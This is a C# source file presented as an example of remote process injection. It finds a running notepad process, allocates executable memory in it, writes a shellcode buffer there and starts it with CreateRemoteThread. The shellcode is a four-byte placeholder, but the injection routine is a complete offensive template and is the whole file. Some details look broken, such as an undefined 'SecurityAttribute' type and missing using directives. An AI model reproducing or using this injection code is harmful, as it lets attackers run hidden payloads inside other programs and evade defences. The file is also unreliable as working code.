//---------------------------------------------------------------
// Author: KrknSec
// Description: Example of basic remote process injection in C#
//---------------------------------------------------------------

using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Diagnostics;

namespace BasicRemoteProc
{
    public class BasicRemoteProc
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread
        (
            IntPtr hProcess,
            SecurityAttribute lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesWritten);


        static void Main()
        {
            // shellcode
            byte[] buf = new byte[]
            {
              0xde,0xad,0xbe,0xef
            };

            // Setup constants for API calls
            const uint MEM_COMMIT = 0x00001000;
            const uint MEM_RESERVE = 0x00002000;
            const uint PAGE_READWRITE = 0x04;
            const uint PAGE_EXECUTE_READWRITE = 0x40;

            // Find and open new process to inject
            Process? process = null;

            // Added a loop to wait until the process is launched
            do {
                string targetProc = "notepad";
                process = Process.GetProcessesByName(targetProc).FirstOrDefault();
            } while(process == null);

            // Once process found, get a handle
            var hProc = process.Handle;

            // Allocate empty memory buffer
            IntPtr bufAddress = IntPtr.Zero;
            bufAddress = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Copy shellcode to memory buffer
            int bytesWritten = 0;
            WriteProcessMemory(hProc, bufAddress, buf, buf.Length, ref bytesWritten);

            // Create thread to execute shellcode
            CreateRemoteThread(hProc, null, 0, bufAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
